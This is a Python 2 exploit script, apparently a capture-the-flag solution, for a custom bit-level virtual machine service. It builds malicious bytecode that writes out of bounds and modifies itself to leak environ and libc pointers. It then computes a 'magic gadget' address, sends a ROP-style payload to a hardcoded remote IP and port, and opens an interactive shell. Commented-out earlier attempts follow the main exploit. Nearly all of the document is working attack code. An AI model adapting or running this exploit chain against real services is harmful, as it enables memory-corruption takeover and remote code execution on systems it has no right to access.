TARGET_REMOTE = True

from struct import pack

# In the writeup, describe using the step-4 bug to overwrite `prog_buf`
# to have out-of-bounds indices. These ChangeMes are values that we're
# going to overwrite to be out-of-bounds. The original value still matters,
# because it affects the toposort.
class ChangeMe(object):
  def __init__(self, fake_idx, targ_idx):
    self.fake_idx = fake_idx
    self.targ_idx = targ_idx
  def __add__(self, i):
    return ChangeMe(self.fake_idx + i, self.targ_idx + i)
  def __str__(self):
    return 'ChangeMe(%d, %d)' % (self.fake_idx, self.targ_idx)

# Indicates a value in the bytecode that will be overwritten by the bytecode
# itself (a la self modifying code). We use this to do a dynamic dereference,
# which isn't supported by the bytecode. `token` is something we need to make
# the toposort not ruin the exploit.
class Reloc(object):
  def __init__(self, fake, name, token):
    self.fake = fake
    self.name = name
    self.token = token

  def __add__(self, i):
    return Reloc(self.fake + i, self.name, self.token + i)

  def __sub__(self, i):
    return Reloc(self.fake - i, self.name, self.token - i)
  def __str__(self):
    return 'ChangeMe(%d, %r, %d)' % (self.fake, self.name, self.token)

# Initiates the overwrite of Relocs.
class DoReloc(object):
  def __init__(self, name, src):
    self.name = name
    self.src = src

# Pad things out to fixed sizes for allocation consistency.
INPUT_SIZE = 1024*2
OUTPUT_SIZE = 128
CODE_INSTRS = 16384 / 4
ALLOC_BITS = 16384 * 4 * 256 # BIG alloc puts us right behind libc! sweet!

# BITS_TO_PROG_OFF = (ALLOC_BITS/8 + 16) * 8 # <- Only true when allocated on the heap. Not true with big sizes.
BITS_TO_PROG_OFF = 8 * (0x7f7529168010 - 0x7f75281d8010)
#16318464

# The remote machine has a slightly different memory layout from my setup.
# I figured this out using the print-back capabilities 
if TARGET_REMOTE:
  BITS_TO_PROG_OFF -= 8 * 4096

class VMWriter(object):
  GARBAGE = 2  # Reserved sctach bit
  ALLOC_BASE = 8 # Must be a multiple of 8.

  def __init__(self):
    self.ops = []
    self.nfakes = 0
    self.allocated_bytes = 0

  def process_relocations(self):
    index = 0
    indexed_ops = []
    for i, op in enumerate(self.ops):
      if isinstance(op, DoReloc):
        # estimate how many instructions we need to insert
        count = 0
        for j in range(i+1, len(self.ops)):
          if isinstance(self.ops[j], DoReloc):
            continue
          for q in self.ops[j]:
            if isinstance(q, Reloc) and q.name == op.name:
              count += 1
        length = 64 + 64 * count # TODO: idk, maybe more?
        indexed_ops.append((index, op))
        index += length
      else:
        indexed_ops.append((index, op))
        index += 1

    writer = VMWriter()
    relocs_done = set()
    for i, (index, op) in enumerate(indexed_ops):
      assert len(writer.ops) == index, "desynch!"
      if isinstance(op, DoReloc):
        # emit reloc
        for j in range(i+1, len(indexed_ops)):
          this_index, this_op = indexed_ops[j]
          if isinstance(this_op, DoReloc):
            continue
          for k, q in enumerate(this_op):
            if isinstance(q, Reloc) and q.name == op.name:
              this_offset = (this_index * 5 + k) * 64
              writer.mov64(ChangeMe(q.token, BITS_TO_PROG_OFF + this_offset), op.src)
        # finish up
        relocs_done.add(op.name)
        left = indexed_ops[i+1][0] - len(writer.ops)
        assert left >= 0, "Ran out of space doing relocation"
        for q in range(left):
          writer.raw(4, 0, 0, 0, self.GARBAGE)
      elif any(isinstance(j, Reloc) for j in op):
        new_op = []
        for j in op:
          if isinstance(j, Reloc):
            assert j.name in relocs_done
            new_op.append(j.fake)
          else:
            new_op.append(j)
        writer.raw(*new_op)
      else:
        writer.raw(*op)

    return writer.ops

  def emit(self):
    reloc_ops = self.process_relocations()
    out = bytearray(16 + CODE_INSTRS*5*8)

    bits_needed = self.ALLOC_BASE + self.allocated_bytes*8
    assert ALLOC_BITS >= bits_needed, "Raise ALLOC_BITS to "+str(bits_needed)
    out[0:8] = pack('<q', ALLOC_BITS)
    assert len(reloc_ops) <= CODE_INSTRS, "Raise CODE_INSTRS to "+str(len(reloc_ops))
    out[8:16] = pack('<q', CODE_INSTRS)

    bits_needed = []
    def in_bounds(x):
      return x & ((1<<64)-1) < ALLOC_BITS
    def fixdown(x, instr_no, arg):
      if not isinstance(x, ChangeMe):
        assert in_bounds(x), "bad idx"
        return x
      #assert in_bounds(x.fake_idx) and not in_bounds(x.targ_idx), "prob not what u want"
      for i in range(64):
        if ((x.fake_idx ^ x.targ_idx) >> i) & 1:
          bits_needed.append((BITS_TO_PROG_OFF + instr_no*5*64 + arg*64 + i, (x.targ_idx >> i)&1))
      return x.fake_idx

    previous_dests = {}
    for i, (c, x, y, z, w) in enumerate(reloc_ops):
      assert w not in (0, 1), "can't write to 0 or 1"
      x, y, w = fixdown(x, i, 1), fixdown(y, i, 2), fixdown(w, i, 4)
      assert w not in (0, 1), "unhandled case, server will error"
      if c == 4:
        z = fixdown(z, i, 3)
      if w != self.GARBAGE and w in previous_dests:
        assert False, "u will get wrecked: [%d] = %d / %d" % (w, previous_dests[w], i)
      previous_dests[w] = i
      out[16+i*5*8:16+(i+1)*5*8] = pack('<qqqqq', c, x, y, z, w)

    for i in range(len(reloc_ops), CODE_INSTRS): # nops
      out[16+i*5*8:16+(i+1)*5*8] = pack('<qqqqq', 1, 0, 0, i, 2)

    if bits_needed:
      print min(i[0] for i in bits_needed), max(i[0] for i in bits_needed)
    assert INPUT_SIZE*8 >= len(bits_needed), "Raise INPUT_SIZE to "+str(len(bits_needed)/8+1)
    ip = bytearray(8 + 8*INPUT_SIZE)
    ip[0:8] = pack('<q', 8*INPUT_SIZE)
    for i in range(len(bits_needed)):
      loc, bit = bits_needed[i]
      ip[8+8*i:8+8*(i+1)] = pack('<q', loc)

    flag = ''.join(
      chr(sum(
        bit<<i for i, (loc, bit) in enumerate(bits_needed[i:i+8])
      ))
      for i in range(0, len(bits_needed), 8)
    ).ljust(INPUT_SIZE, 'A')

    for i in range(len(bits_needed), 8*INPUT_SIZE):
      ip[8+8*i:8+8*(i+1)] = pack('<q', self.GARBAGE)
    return out, ip, flag

  def raw(self, *args):
    self.ops.append(args)
  def and3(self, dst, src1, src2):
    self.ops.append((1, src1, src2, -1, dst))
  def or3(self, dst, src1, src2):
    self.ops.append((2, src1, src2, -1, dst))
  def xor3(self, dst, src1, src2):
    self.ops.append((3, src1, src2, -1, dst))
  def ite(self, dst, cond, src1, src2):
    self.ops.append((4, cond, src1, src2, dst))

  def mov(self, dst, src, token=None):
    if token is None:
      token = src
    self.ops.append((4, 0, token, src, dst))

  def mov64(self, dst, src):
    for i in range(64):
      self.mov(dst+i, src+i)

  def and64(self, dst, src1, src2):
    for i in range(64):
      self.and3(dst+i, src1+i, src2+i)
  def or64(self, dst, src1, src2):
    for i in range(64):
      self.or3(dst+i, src1+i, src2+i)
  def xor64(self, dst, src1, src2):
    for i in range(64):
      self.xor3(dst+i, src1+i, src2+i)

  def add64(self, dst, src1, src2):
    if isinstance(dst, int):
      assert (not isinstance(src1, int) or abs(dst-src1) >= 64) and \
             (not isinstance(src2, int) or abs(dst-src2) >= 64)
    andbits = self.alloc(64)
    self.and64(andbits, src1, src2)
    xorbits = self.alloc(64)
    self.xor64(xorbits, src1, src2)
    carrybits = self.alloc(64)
    scratch = self.alloc(64)
    self.and3(carrybits, src1, src2)
    self.xor3(dst, src1, src2)
    for j in range(1, 64):
      self.xor3(dst+j, xorbits+j, carrybits+j-1)
      self.and3(scratch+j, xorbits+j, carrybits+j-1)
      self.or3(carrybits+j, scratch+j, andbits+j)

  def not64(self, dst, src):
    for i in range(64):
      self.xor3(dst+i, 1, src+i)

  def alloc(self, bits):
    ret = self.ALLOC_BASE + self.allocated_bytes * 8
    self.allocated_bytes += (bits+7)/8
    return ret

  def make_const64(self, value, token=None):
    base = self.alloc(64)
    for i in range(64):
      self.mov(base+i, (value >> i)&1, token=(token+i if token is not None else None))
    return base

  def make_fake(self):
    self.nfakes += 1
    return self.make_const64(int(('%02x' % (self.nfakes + ord('0'))) * 8, 16))

  def do_reloc(self, name, src):
    # pre-allocate space for the reloc code
    self.ops.append(DoReloc(name, src))


#
# This is the logic for the VM code we send
#

writer = VMWriter()

ENVIRON_IDX = 8 * (0x7f75291c8140 - 0x7f75281d8010)
ENVIRON_TO_DEBUG = (0x7ffef91b6c94 - 0x7ffef91b6de8)
LIBC_ADDR_IDX = 8 * (0x7f5bd998c748 - 0x7f5bd90e9010)
LIBC_ADDR_TO_SELF = (0x7f5bd90e9010 - 0x7f5bd9990f20)

reloc = writer.alloc(64)
pointeroff = writer.alloc(64)
debug = writer.alloc(64)
selfptr = writer.alloc(64)
negself = writer.alloc(64)
writer.add64(debug, writer.make_const64(ENVIRON_TO_DEBUG), ChangeMe(writer.make_fake(), ENVIRON_IDX))
writer.add64(selfptr, writer.make_const64(LIBC_ADDR_TO_SELF - 1), ChangeMe(writer.make_fake(), LIBC_ADDR_IDX))
writer.not64(negself, selfptr)
writer.add64(pointeroff, debug, negself)

# Multiply by 8, since we calculated a pointer offset but our relocations are
# based on bit indices.
pointeroff2 = writer.alloc(64)
pointeroff4 = writer.alloc(64)
writer.add64(pointeroff2, pointeroff, pointeroff)
writer.add64(pointeroff4, pointeroff2, pointeroff2)
writer.add64(reloc, pointeroff4, pointeroff4)

writer.do_reloc('reloc', reloc)
token = writer.alloc(64)
blah = writer.alloc(1)
blah2 = writer.alloc(1)
writer.or3(blah2, token, reloc)
writer.or3(blah, 1, blah2)
q = [writer.alloc(1) for i in range(100)] # Try to make this come last after the sort? idk. YAY IT WORKED
[writer.or3(x, 1, y) for x, y in zip(q[:-1], q[1:])]
writer.mov(Reloc(writer.alloc(1), 'reloc', token), q[0])

code, ip, flag = writer.emit()


#
# Test code / past attempts that didn't work
#

# # NEED TO RE-FIND AS CODE CHANGES.
# LIBC_ADDR_IDX = (0xbfc878 - 0xbd8030) * 8
# HEAP_ADDR_IDX = (0xbfc850 - 0xbd8030) * 8
# FIX_OFFSET_BITS = 8 * (((0xbd8030 + ~0xbfc800 + 0x7fbfd8fb8678) & ((1<<64)-1)) - 0x7fbfd8c13000)
#
# testalloc = writer.alloc(64)
#
# reloc = writer.alloc(64)
# temp = writer.alloc(64)
# notheapaddr = writer.alloc(64)
# writer.not64(notheapaddr, ChangeMe(writer.make_fake(), HEAP_ADDR_IDX))
# writer.add64(temp, notheapaddr, ChangeMe(writer.make_fake(), LIBC_ADDR_IDX))
# writer.add64(reloc, temp, writer.make_const64(FIX_OFFSET_BITS + 0))
#
# writer.do_reloc('libc', reloc)
# token = writer.alloc(64)
# writer.mov64(Reloc(writer.alloc(64), 'libc', token), token)
#
# # PROG_OFF = 1 + 0xdeadbeef - 0xdeadbeef # TODO
# # # .got.plt:00000000006050B8 off_6050B8      dq offset write
# # WRITE_TO_MAGIC_GADGET = 0x41374 - 0xdbbf0 # magic_gadget - write
# # writer.add64_inplace(PROG_OFF + 0x6050B8, WRITE_TO_MAGIC_GADGET)
#
# code, ip, flag = writer.emit()

# ########################################
# writer = VMWriter()
# c1 = writer.alloc(64)
# c2 = writer.make_const64(0x3f3f3f3f3f3f3f3f)
# c3 = writer.make_const64(0x0202020202020202)
# writer.add64(c1, c2, c3)
# # # writer.not64(c1, writer.make_const64(~0x4142434445464748))
# code, ip, flag = writer.emit()
# ########################################

#########################################
# writer = VMWriter()
# writer.mov((1<<48) + 3, 0)
# code, ip, flag = writer.emit()
#########################################

########################################
# writer = VMWriter()
# c1 = writer.alloc(64)
# c2 = writer.alloc(64)
# reloc_src = writer.make_const64(c1+1)
# writer.do_reloc('reloc', reloc_src)
#
# token = writer.alloc(64)
# blah = writer.alloc(1)
# writer.or3(blah, token, 1)
# writer.mov(Reloc(writer.alloc(1), 'reloc', token), blah)
# code, ip, flag = writer.emit()
########################################


op = pack("<q", 8 * OUTPUT_SIZE)
for i in range(8 * OUTPUT_SIZE):
  op += pack("<q", writer.ALLOC_BASE+i)

# op = pack("<q", 8 * OUTPUT_SIZE)
# for i in range(8 * OUTPUT_SIZE):
#   op += pack("<q", BITS_TO_PROG_OFF+i)

import socket
if TARGET_REMOTE:
  sock = socket.create_connection(('202.120.7.199', 24680))
else:
  sock = socket.create_connection(('debian0.vm', 24680))

raw_input('>')
print (len(code)+len(ip)+len(flag)+len(op)) / 1024
sock.send(code)
sock.send(ip)
#raw_input('>')
sock.send(flag)
sock.send(op)

libc_pointer = 0
import sys
for i in xrange(0, OUTPUT_SIZE):
  c = sock.recv(1)
  if not c:
    sys.stdout.write('\n')
    break
  else:
    sys.stdout.write('%02x ' % ord(c))
    #sys.stdout.write(repr(c)[1:-1])
    if i%8 == 7:
      sys.stdout.write('\n')
    sys.stdout.flush()
    if 24 <= i < 32: # THIS IS OUR LIBC POINTER
      libc_pointer += ord(c) << (8*(i-24))

from time import sleep
sleep(1)
libc_pointer += 5518181 # offset to magic gadget
sock.send(pack('<Q', 0x0000000000400be9) * 32)
sock.send(pack('<Q', libc_pointer))

from telnetlib import Telnet
t = Telnet()
t.sock = sock
print "take the wheel"
t.interact()
